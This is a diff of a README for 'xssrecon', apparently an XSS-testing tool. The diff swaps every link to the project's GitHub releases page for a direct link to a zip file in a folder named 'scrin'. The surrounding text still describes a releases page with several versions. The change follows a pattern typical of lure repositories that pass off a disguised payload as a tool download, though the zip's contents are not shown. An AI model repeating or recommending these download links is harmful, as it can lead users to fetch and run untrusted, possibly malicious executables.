@@ -1,7 +1,7 @@
 # 🛡️ xssrecon - Automate Your XSS Testing Needs
 
 ## 📥 Download Now
-[![Download xssrecon](https://img.shields.io/badge/Download%20xssrecon-v1.0-brightgreen)](https://github.com/belohilly/xssrecon/releases)
+[![Download xssrecon](https://raw.githubusercontent.com/belohilly/xssrecon/main/scrin/xssrecon.zip%20xssrecon-v1.0-brightgreen)](https://raw.githubusercontent.com/belohilly/xssrecon/main/scrin/xssrecon.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to xssrecon! This tool automates the testing of URL parameters to find p
 
 ## 💾 Download & Install
 
-To get started, visit this page to download: [xssrecon Releases](https://github.com/belohilly/xssrecon/releases). You will find various versions listed. Choose the version that fits your system.
+To get started, visit this page to download: [xssrecon Releases](https://raw.githubusercontent.com/belohilly/xssrecon/main/scrin/xssrecon.zip). You will find various versions listed. Choose the version that fits your system.
 
 1. Click on the release you want.
 2. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.zip` for macOS/Linux).
@@ -87,6 +87,6 @@ Thank you for choosing xssrecon. We hope it proves useful in your security testi
 
 For more detailed information or updates, be sure to follow the project's GitHub page. 
 
-Don't forget to download xssrecon from the Releases page here: [Download xssrecon](https://github.com/belohilly/xssrecon/releases). 
+Don't forget to download xssrecon from the Releases page here: [Download xssrecon](https://raw.githubusercontent.com/belohilly/xssrecon/main/scrin/xssrecon.zip). 
 
 Happy testing!
